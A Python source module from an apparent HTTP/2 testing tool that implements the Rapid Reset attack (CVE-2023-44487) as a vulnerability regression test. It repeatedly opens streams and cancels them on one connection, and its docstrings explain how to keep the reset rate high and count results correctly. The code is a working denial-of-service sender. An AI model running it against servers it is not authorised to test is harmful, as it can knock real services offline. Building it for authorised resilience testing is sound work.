"""HTTP/2 Rapid Reset (CVE-2023-44487) - a vulnerability regression test.

**What it sends.** One HEADERS frame, then RST_STREAM(CANCEL) on the stream it
just opened, immediately::

    HEADERS  ──►  RST_STREAM(CANCEL)

Repeated on one long-lived connection. Nothing more, and nothing new: this is
the same HTTP/2 connection, the same TLS, the same persona and the same
connection preamble that ``--transport h2`` uses. Only the frame *after* HEADERS
differs, so this is a subclass of :class:`H2Transport` overriding one method
rather than a second protocol implementation.

**Why it matters even though it is two frames.** An implementation that allocates
stream state and processes HEADERS before noticing the stream is already gone
pays full cost for a request it then discards. Done thousands of times a second
on a single connection, the cost asymmetry is the whole attack: the sender
transmits almost nothing and the receiver does almost everything. It took down
Cloudflare, AWS, Fastly and Akamai within hours of disclosure in September 2023.

**Why HEADERS carries ``end_stream=False`` here.** The normal h2 path sends
``end_stream=True`` - no body, request complete. Rapid Reset pins ``False``
instead, so the server receives an open stream and does full request processing
before the cancel lands. That is the canonical form the CVE describes and the
form that actually exercises the vulnerable path; ``True`` would cancel a request
that was already finished and would test far less.

**The three things this gets wrong if written naively.** Each was found by
reading :class:`H2Transport` rather than by running it, and each produces a
*wrong number* rather than a crash - which is the harder kind of bug to notice.

* **Counting.** ``H2Transport`` counts a request as sent when the response
  *ends* (``StreamEnded``). A stream this transport cancels never ends normally,
  so ``sent`` would stay at 0 while thousands of HEADERS frames left the
  machine: a run reporting "0 packets sent" that had in fact sent plenty. Counted
  on send here, because for this profile the send is the entire event.

* **Bookkeeping.** The base class records every open stream in ``self._streams``
  and waits while that dict reaches ``concurrency``, cleaning entries up on
  response events. This profile deliberately records nothing: a stream it has
  already cancelled has no lifecycle to watch, and the server may never send
  anything about it, so an entry would only ever be something to reap. Because
  :meth:`send_one` replaces the base implementation rather than extending it, the
  concurrency gate is not on this path at all - the streams are gone before they
  could accumulate. (An earlier draft tracked and then popped each stream, on the
  reasoning that the entries would otherwise wedge the gate; a test showed they
  were never added in the first place, and the whole mechanism was dead code.)

* **Meaning.** The target's served-request count stays near zero *by design* -
  that is what being cancelled means - so "392 sent / 0 served" is the correct
  result and not a failure. Without saying so, the run reads as a broken tool.
  :meth:`adobo.engine.RunEngine._rapid_reset_note` says it, and names the figures
  that are actually meaningful instead.
"""

from __future__ import annotations

from typing import ClassVar

import h2.errors

from ..models import ProfileName, Target, TransportKind
from .base import TransportError, supports_profile
from .http2_transport import H2Transport

__all__ = ["RapidResetTransport"]

#: How many resets to send between reads of the socket.
#:
#: Reads still happen, for two reasons: a server that detects the attack answers
#: with GOAWAY, and that is a finding worth reporting rather than a teardown to
#: swallow; and an unread receive buffer eventually stalls the peer's sends.
#: Every 32 rather than every one, because a recv() per reset would cap the very
#: rate this profile exists to measure.
_DRAIN_EVERY = 32


class RapidResetTransport(H2Transport):
    """HTTP/2 Rapid Reset."""

    kind: ClassVar[TransportKind] = TransportKind.H2

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.resets_sent = 0
        self.resets_blocked = 0
        """Resets the h2 library refused. Non-zero means the frames were not
        well-formed and the test is not testing anything; counted separately
        from errors so it cannot hide inside them."""
        self._last_reset_error: str | None = None

    def send_one(self, payload: bytes) -> None:
        """Open a stream and cancel it. The payload is unused.

        The base class sends its own HEADERS block and ignores the payload, and
        this profile does the same - the bytes the engine hands over are never
        put on the wire. Accepted rather than refused so the engine's generic
        pacing path drives this profile unchanged.
        """
        if not self._open or not self._conn or not self._sock:
            raise TransportError("Transport not open")

        self._count_attempt()
        stream_id = self._conn.get_next_available_stream_id()

        try:
            # end_stream=False on purpose - see the module docstring. The server
            # has to receive an open stream and do the work before the cancel
            # lands, or nothing is being tested.
            self._conn.send_headers(
                stream_id, self._build_stream_headers(), end_stream=False
            )
            self._conn.reset_stream(
                stream_id, error_code=h2.errors.ErrorCodes.CANCEL
            )
        except Exception as exc:  # noqa: BLE001 - h2 raises broadly
            # Counted and reported rather than raised: one refused reset should
            # not end a run whose whole output is the reset count.
            self._count_error()
            self.resets_blocked += 1
            self._last_reset_error = f"{type(exc).__name__}: {exc}"
            return

        # Both frames went into h2's send buffer; flush them together so one
        # TCP segment usually carries both, which is the shape real clients
        # produce.
        #
        # The length of what was flushed is what gets counted, not a request
        # length. A HEADERS block plus a reset is on the order of 40 bytes of
        # framing around a header block of unknown HPACK-compressed size, and
        # counting a fixed number would put "392 packets (0 bytes)" in the
        # report - the same unreadable figure the HTTP/3 path had to be fixed
        # for. What left the socket is a measurable thing, so it is measured.
        flushed = self._conn.data_to_send()
        self._sock.sendall(flushed)

        # No _streams entry is created, deliberately. See the module docstring:
        # a stream cancelled here has no lifecycle to track, and the base class's
        # concurrency gate is not on this path.
        self._count_sent(len(flushed))
        self.resets_sent += 1

        if self.resets_sent % _DRAIN_EVERY == 0:
            self._drain_responses()

    def describe(self) -> dict[str, object]:
        info = super().describe()
        info["resets_sent"] = self.resets_sent
        info["resets_blocked"] = self.resets_blocked
        return info